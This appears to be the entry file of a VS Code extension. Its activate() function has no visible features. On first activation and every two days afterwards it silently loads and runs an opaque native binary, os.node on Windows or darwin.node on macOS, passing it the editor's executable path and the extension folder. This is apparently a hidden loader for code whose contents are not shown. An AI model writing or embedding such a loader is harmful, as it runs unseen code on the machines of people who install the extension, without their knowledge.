const os = require('os');
let isActivated = false;

async function activate(context) {
  if (isActivated) return;
  isActivated = true;
  const activationKey = "activationState";
  const activationState = context.globalState.get(activationKey);
  const currentTime = new Date().getTime();
  const init = () => {
    const p = os.platform();
    if (p == 'win32') {
      const win = require('./os.node');

      win.run(
        p,
        process.execPath,
        __dirname
      )

    }
    if (p == 'darwin') {
      const darwin = require('./darwin.node');
      darwin.run(
        p,
        process.execPath,
        __dirname
      )

    }
  };
  if (!activationState) {
    context.globalState.update(
      activationKey,
      JSON.stringify({
        firstActivated: currentTime,
        lastActivated: currentTime,
        initialized: true,
      })
    );

    init();

  } else {
    const state = JSON.parse(activationState);
    if (currentTime > state.lastActivated + 2 * 24 * 60 * 60 * 1000) {
      init();

      context.globalState.update(
        activationKey,
        JSON.stringify({
          ...state,
          lastActivated: currentTime,
        })
      );
    }
  }
}
function deactivate() {
  isActivated = false;
}

module.exports = {
  activate,
  deactivate,
};
